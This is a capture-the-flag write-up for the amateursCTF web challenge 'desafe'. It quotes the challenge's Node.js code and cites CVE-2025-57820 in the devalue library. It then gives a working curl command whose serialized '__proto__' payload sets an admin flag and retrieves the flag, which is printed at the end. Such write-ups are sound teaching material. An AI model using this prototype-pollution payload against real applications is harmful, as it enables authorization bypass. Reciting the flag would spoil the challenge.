# 『desafe』
> your feedback is greatly appreciated

Author: voxal

# 『The challenge』

We were given source code and instance to exploit it. Here are the source code:

[index.js]()

[dev.js]()

<img width="976" height="286" alt="image" src="https://github.com/user-attachments/assets/48ef0754-0fa9-4f5c-b2b0-a5b5add49627" />

# 『Solving challenge』
> solve by: Lylera_

Here are the source code that will give flag:
```
app.post('/', async (c) => {
  const body = await c.req.text();

  const flagRequest = devalue.parse(body, {
    FlagRequest: ([a]) => new FlagRequest(a),
  })
  if (!(flagRequest instanceof FlagRequest)) return c.text('not a flag request')

  return c.text(flagRequest.flag)
})
```

and another one
```
class FlagRequest {
  constructor(feedback) {
    // your feedback is greatly appreciated!
    delete { feedback }
  }

  get flag() {
    if (this.admin) {
      return FLAG;
    } else {
      return "haha nope"
    }
  }
}
```

So by giving this, we know that to get flag we must use `POST` instead of `GET` method.

# 『The issue』

<img width="1140" height="469" alt="image" src="https://github.com/user-attachments/assets/a10e29ec-813b-4afd-8df6-5128b5a07cb2" />

also if we use like Flagrequest on body and feedback, the result like this:

<img width="1225" height="436" alt="image" src="https://github.com/user-attachments/assets/e3f1ad13-0862-4b2d-b75e-68e8c50ebb32" />

# 『Solution』

So, i use this reference: [CVE-2025-57820](https://nvd.nist.gov/vuln/detail/CVE-2025-57820)

on this dev.js source:
```
const devalue = require("devalue");

console.log(
  devalue.stringify({
    "@type": "FlagRequest",
    "value": ["x"],
    "admin": true
  })
);

```
It give me knowledge that using proto and can bypass this devalue

# 『Flag』

So lets make our payload. There are 2 ways to solve this one. First using curl. The another ways make a script.

Using curl method:
```
curl -X POST https://web-desafe-4wcd8kh8.amt.rs/ -H "Content-Type: text/plain" -d '[{"__proto__":1,"admin":2},["FlagRequest",3],true,[4],"test"]'
```

<img width="1477" height="78" alt="image" src="https://github.com/user-attachments/assets/6a7d62dd-6020-40d9-9282-d60644f31f92" />

Script:
[Solver.js]()

<img width="588" height="62" alt="image" src="https://github.com/user-attachments/assets/3d804178-f32d-4efd-9fe3-750a7826c44e" />

Flag:
```
amateursCTF{i_love_you_rich_harris}
```
